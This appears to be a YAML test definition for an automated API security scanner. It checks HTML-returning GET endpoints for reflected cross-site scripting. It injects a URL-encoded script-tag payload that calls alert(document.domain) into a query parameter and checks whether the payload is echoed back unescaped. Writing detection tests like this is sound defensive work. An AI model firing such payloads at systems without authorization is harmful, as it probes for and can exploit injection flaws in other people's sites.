api_selection_filters:
  response_code:
    gte: 200
    lt: 300

  method:
    contains_either:
      - "GET"

  response_payload:
    contains_either:
      - <!doctype html>

  query_param:
    for_one:
      key:
        regex: .*
        extract: query_param_key

execute:
  type: single
  requests:
    - req:
        - modify_query_param:
            query_param_key: '%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'

validate:
  response_payload:
    contains_all:
      - "<script>alert(document.domain)</script>"
      - <!doctype html>
